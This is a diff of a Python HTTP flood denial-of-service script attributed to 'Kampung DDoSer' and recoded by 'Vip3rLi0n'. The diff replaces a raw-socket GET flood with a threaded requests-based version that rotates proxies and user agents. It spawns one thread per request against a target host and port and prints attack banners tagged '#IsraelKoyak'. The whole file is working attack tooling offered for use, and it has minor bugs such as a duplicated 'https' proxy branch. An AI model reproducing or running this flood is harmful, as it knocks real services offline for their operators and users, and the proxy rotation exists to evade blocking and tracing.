@@ -1,102 +1,87 @@
 # -*- coding: utf-8 -*-
-# Author : Kampung DDoSer
-# Recoded by : Kampung DDoSer
-# Cleaned by : AnaMontana
-# All copyrights to Kampung DDoSer
+# Original Author : Kampung DDoSer
+# Recoded and Updated by Vip3rLi0n
 
 import random
-import socket
 import string
-import sys
 import threading
+import requests
+import argparse
 import time
 
-# Parse inputs
-host = ""
+parser = argparse.ArgumentParser(description="HTTP Flood by Kampung DDoSer")
+parser.add_argument("hostname", help="Hostname or IP address (http://example.com / https://example.com)")
+parser.add_argument("port", type=int, help="Port")
+parser.add_argument("requests", type=int, help="Number of requests")
+parser.add_argument("proxy_type", default="socks5", help="Proxy type (http, https, socks4, socks5)")
+parser.add_argument("--proxy", default="proxy.txt", help="Path to proxy file (default: proxy.txt)")
+parser.add_argument("--ua", default="ua.txt", help="Path to user-agent file (default: ua.txt)")
+args = parser.parse_args()
+
 ip = ""
-port = 0
-num_requests = 0
+port = args.port
+num_requests = args.requests
 
-if len(sys.argv) == 2:
-    port = 80
-    num_requests = 100000000
-elif len(sys.argv) == 3:
-    port = int(sys.argv[2])
-    num_requests = 100000000
-elif len(sys.argv) == 4:
-    port = int(sys.argv[2])
-    num_requests = int(sys.argv[3])
-else:
-    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
-    sys.exit(1)
-
-# Convert FQDN to IP
-try:
-    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
-    ip = socket.gethostbyname(host)
-except socket.gaierror:
-    print (" ERROR\n Make sure you entered a correct website")
-    sys.exit(2)
-
-# Create a shared variable for thread counts
 thread_num = 0
 thread_num_mutex = threading.Lock()
 
+def proxy_list(file_path):
+    with open(file_path, 'r') as file:
+        proxy_list = file.read().splitlines()
+    return proxy_list
 
-# Print thread status
-def print_status():
-    global thread_num
-    thread_num_mutex.acquire(True)
+def user_agents(file_path):
+    with open(file_path, 'r') as file:
+        ua = file.read().splitlines()
+    return ua
 
-    thread_num += 1
-    #print the output on the sameline
-    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# This Is Kampung DDoSer #IsraelKoyak #-#-#")
-    sys.stdout.flush()
-    thread_num_mutex.release()
-
-
-# Generate URL Path
-def generate_url_path():
+async def generate_url_path():
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, 5))
     return data
 
-
-# Perform the request
-def attack():
-    print_status()
-    url_path = generate_url_path()
-
-    # Create a raw socket
-    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def attack(session, proxy, ua, time_str):
+    user_agent = random.choice(ua)
+    prox_type = args.proxy_type
+    if prox_type == 'http':
+        proxy_get = {"http": proxy}
+    elif prox_type == 'https':
+        proxy_get = {"https": proxy}
+    elif prox_type == 'https':
+        proxy_get = {"socks4": proxy}
+    else:
+        proxy_get = {"socks5": proxy}
 
     try:
-        # Open the connection on that raw socket
-        dos.connect((ip, port))
+        response = session.get(f"{args.hostname}:{port}/", headers={"User-Agent": user_agent}, proxies=proxy_get, timeout=10)
+        response_text = response.text
+        if response_text:
+            print(f'[{time_str}] Target Attacked from: {proxy}')
+    except requests.Timeout:
+        print(f'[{time_str}] Request timed out from: {proxy}')
+    except Exception as e:
+        print(f'[{time_str}] Attack Failed from: {proxy}')
 
-        # Send the request according to HTTP spec
-        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
-        dos.send(byt)
-    except socket.error:
-        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
-    finally:
-        # Close our socket gracefully
-        dos.shutdown(socket.SHUT_RDWR)
-        dos.close()
+def main():
+    proxies = proxy_list(args.proxy)
+    ua = user_agents(args.ua)
+    print("#-#-# This Is Kampung DDoSer #IsraelKoyak #-#-#\n")
+    print(f"[#] Attack started on {args.hostname} || Port: {str(port)} || # Requests: {str(num_requests)}")
 
+    with requests.Session() as session:
+        threads = []
 
-print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
+        for i in range(num_requests):
+            current_time = time.localtime()
+            time_str = time.strftime("%I:%M:%S %p", current_time)
+            proxy = random.choice(proxies)
+            thread = threading.Thread(target=attack, args=(session, proxy, ua, time_str))
+            thread.start()
+            threads.append(thread)
+            time.sleep(0.01)
 
-# Spawn a thread per request
-all_threads = []
-for i in range(num_requests):
-    t1 = threading.Thread(target=attack)
-    t1.start()
-    all_threads.append(t1)
+        for thread in threads:
+            thread.join()
 
-    # Adjusting this sleep time will affect requests per second
-    time.sleep(0.01)
-
-for current_thread in all_threads:
-    current_thread.join()  # Make the main thread wait for the children threads
+if __name__ == "__main__":
+    main()
